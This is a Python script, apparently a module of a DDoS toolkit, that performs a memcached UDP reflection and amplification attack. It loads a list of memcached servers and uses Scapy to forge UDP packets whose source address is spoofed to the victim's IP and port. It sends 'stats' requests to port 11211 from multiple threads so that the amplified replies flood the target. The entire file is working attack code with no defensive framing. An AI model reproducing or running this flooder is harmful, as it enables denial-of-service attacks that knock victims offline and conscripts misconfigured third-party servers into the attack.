import random
import threading
from queue import Queue
from scapy.all import IP, UDP, send, Raw
from colorama import Fore

# Load MEMCACHED servers list
with open("tools/L4/memcached_servers.txt", "r") as f:
    memcached_servers = [line.strip() for line in f.readlines()]

# Payload
payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

# Define function to send packets
def send_packet(target, server, packets, packet_queue):
    try:
        packet = (
            IP(dst=server, src=target[0])
            / UDP(sport=target[1], dport=11211)
            / Raw(load=payload)
        )
        packet_queue.put(packet, block=False)
    except Exception as e:
        print(f"{Fore.MAGENTA}Error while sending forged UDP packet\n{Fore.MAGENTA}{e}{Fore.RESET}")
    else:
        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Queued {packets} forged UDP packets from memcached server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}")

# Define function to flood with threads
def flood(target):
    server = random.choice(memcached_servers)
    packets = random.randint(10, 150)
    server = server.replace("\n", "")
    num_threads = 10
    packet_queue = Queue()

    # Create threads
    thread_list = [threading.Thread(target=send_packet, args=(target, server, packets, packet_queue)) for i in range(num_threads)]

    # Start threads
    for thread in thread_list:
        thread.start()

    # Join threads
    for thread in thread_list:
        thread.join()

    # Send queued packets
    while not packet_queue.empty():
        packet = packet_queue.get(block=False)
        send(packet, verbose=False)

    print(f"{Fore.GREEN}[+] {Fore.YELLOW}Sent {packets * num_threads} forged UDP packets from memcached server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}")
